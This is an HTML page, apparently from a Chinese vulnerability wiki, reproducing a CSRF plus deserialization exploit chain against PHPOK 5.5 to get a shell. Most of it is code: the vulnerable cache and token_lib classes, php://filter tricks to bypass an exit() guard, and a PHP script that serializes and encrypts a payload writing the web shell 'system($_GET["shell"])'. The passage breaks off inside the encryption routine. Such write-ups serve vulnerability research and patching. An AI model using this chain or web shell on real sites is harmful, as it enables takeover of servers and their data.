@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PHPOK/PHPOK%205.5%20csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PHPOK 5.5 csrf+反序列化漏洞getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PHPOK 5.5 csrf+\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1egetshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+          ]},
+          {title: "PHPOK 5.5", url: "#phpok-55", children: [
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2017-9841）PHPunit 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpok-55-csrfgetshell">PHPOK 5.5 csrf+反序列化漏洞getshell<a class="headerlink" href="#phpok-55-csrfgetshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h1 id="phpok-55">PHPOK 5.5<a class="headerlink" href="#phpok-55" title="Permanent link">&para;</a></h1>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h4 id="_4">可利用恶意类<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>恶意类文件：<code>framework\engine\cache.php</code></p>
+<p><strong>关键代码：</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">cache</span><span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$content</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$id</span> <span class="o">||</span> <span class="nv">$content</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">status</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_time</span><span class="p">();</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">folder</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;&lt;?php exit();?&gt;&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_time</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_count</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">db</span><span class="p">){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key_list</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">cache_index</span><span class="p">(</span><span class="nv">$id</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key_id</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key_list</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expired</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>很明显的<code>__destruct</code>方法调用了<code>save</code>方法，且传递的两个参数皆可控。</p>
+<p>跟进<code>save</code>方法，可以看到里面调用了一个<code>file_put_contents</code>函数，且该函数的第一个参数可控，第二个参数部分可控。</p>
+<p>第二个参数在最前面拼接了``，使得后面再拼接的PHP代码也无法执行。</p>
+<p>但是由于<code>file_put_contents</code>的第一个参数是可控的，所以我们可以通过控制第一个参数，来达到绕过<code>exit()</code>的效果。</p>
+<p><code>file_put_contents</code>的第一个参数是可以使用协议的，例如：</p>
+<ul>
+<li><code>php://output</code></li>
+<li><code>php://filter/read=convert.base64-decode/resource=</code></li>
+<li>等等</li>
+</ul>
+<p>通过控制协议，可以对文件内容进行各种过滤操作。同时我们可以注意到``PHP的标签本质上是一段xml代码，所以我们可以使用<code>php://filter</code>的<code>string.strip_tags</code>过滤器，去除这一段代码。</p>
+<p>demo：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/read=string.strip_tags/resource=php://input&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p><img alt="1.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId26.png" /></p>
+<p>但是如果直接这样操作，会把我们后面也添加的PHP代码也给去掉，所以还得把加入的PHP代码通过base64encode的方式添加进去，再利用<code>php://filter</code>的<code>convert.base64-decode</code>进行还原。使用<code>|</code>符号能在<code>php://filter</code>中使用两个过滤器。</p>
+<p>demo：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/read=string.strip_tags|convert.base64-decode/resource=php://input&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p><img alt="2.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId27.png" /></p>
+<p>对文件写入时，将<code>read</code>修改为<code>write</code>即可。</p>
+<h4 id="_5">反序列化<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>漏洞文件： <code>framework/libs/token.php</code></p>
+<p><strong>关键代码：</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">token_lib</span><span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">decode</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;+&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
+        <span class="nv">$keyc</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyc_length</span><span class="p">);</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyc_length</span><span class="p">));</span>
+        <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
+        <span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span><span class="nv">$cryptkey</span><span class="p">);</span>
+        <span class="nv">$chkb</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$rs</span><span class="p">,</span><span class="mi">26</span><span class="p">)</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyb</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$rs</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">time</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$rs</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nv">$chkb</span><span class="p">){</span>
+            <span class="nv">$info</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$rs</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>看函数名字就可以猜到这个函数是某个密文的解密方法，并且在解密后进行了反序列化操作。</p>
+<p>如果我们可以将序列化后的类，通过对应的<code>encode</code>方法，生成<code>decode</code>函数的解密的格式，那么我们就可以反序列化该类。</p>
+<p><code>encode</code>方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">token_lib</span><span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">keyid</span><span class="p">(</span><span class="nv">$keyid</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$keyid</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">();</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">config</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyb</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+        <span class="nv">$expiry_time</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expiry</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expiry</span> <span class="o">:</span> <span class="mi">365</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">3600</span><span class="p">;</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,(</span><span class="nv">$expiry_time</span> <span class="o">+</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">time</span><span class="p">))</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
+        <span class="nv">$keyc</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">microtime</span><span class="p">()</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)),</span> <span class="o">-</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyc_length</span><span class="p">);</span>
+        <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
+        <span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span><span class="nv">$cryptkey</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$rs</span><span class="p">));</span>
+        <span class="c1">//return $keyc.base64_encode($rs);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>可以看到<code>encode</code>与<code>decode</code>方法都需要导入一个<code>keyid</code>值。于是全局搜索<code>-&gt;keyid(</code></p>
+<p><img alt="3.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId29.png" /></p>
+<p>得知了这是在<code>site</code>数组里面的<code>api_code</code>值，且该值只能通过后台设置。</p>
+<h4 id="csrf">CSRF<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h4>
+<p>这部分就不细分析了，直接黑盒抓后台修改<code>api_code</code>的请求，经过测试后可以发现，这个功能点没有进行CSRF防护：</p>
+<p><img alt="4.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId31.png" /></p>
+<p>可以看到，没有任何的CSRF防护</p>
+<h3 id="_6">利用<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>至此，我们可以通过这些漏洞进行getshell了。</p>
+<ol>
+<li>诱导管理员访问精心构造的CSRF脚本，修改<code>api_code</code></li>
+<li>利用已知的<code>api_code</code>，对上面可被恶意反序列化的类进行序列化后加密</li>
+<li>调用解密函数，触发反序列化</li>
+</ol>
+<p>假设此处已经通过CSRF重置了系统的<code>api_code</code>为<code>123456</code></p>
+<p><img alt="5.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId33.png" /></p>
+<p>使用脚本序列化恶意类，并对其进行<code>encode</code></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">cache</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$key_id</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$key_list</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$folder</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key_id</span> <span class="o">=</span> <span class="s1">&#39;naiquan&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key_list</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="s1">&#39;&lt;?php system($_GET[&quot;shell&quot;]);?&gt;&#39;</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">folder</span> <span class="o">=</span> <span class="s1">&#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">token</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$keyid</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$keyc_length</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$keya</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$keyb</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$time</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">3600</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">keyid</span><span class="p">(</span><span class="nv">$keyid</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$keyid</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">();</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">config</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyb</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$expiry_time</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expiry</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expiry</span> <span class="o">:</span> <span class="mi">365</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">3600</span><span class="p">;</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,(</span><span class="nv">$expiry_time</span> <span class="o">+</span> <span class="nb">time</span><span class="p">()))</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
+        <span class="nv">$keyc</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">microtime</span><span class="p">()</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)),</span> <span class="o">-</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keyc_length</span><span class="p">);</span>
+        <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
+        <span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span><span class="nv">$cryptkey</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$rs</span><span class="p">));</span>
+        <span class="c1">//return $keyc.base64_encode($rs);</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">core</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span><span class="nv">$cryptkey</span><span class="p">){</span>
+        <span class="nv">$key_length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
+        <span class="nv">$string_length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="nv">$box</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+        <span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="c1">// 产生密匙簿</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+            <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="c1">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+            <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+            <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+            <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+            <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="c1">// 核心加解密部分</span>
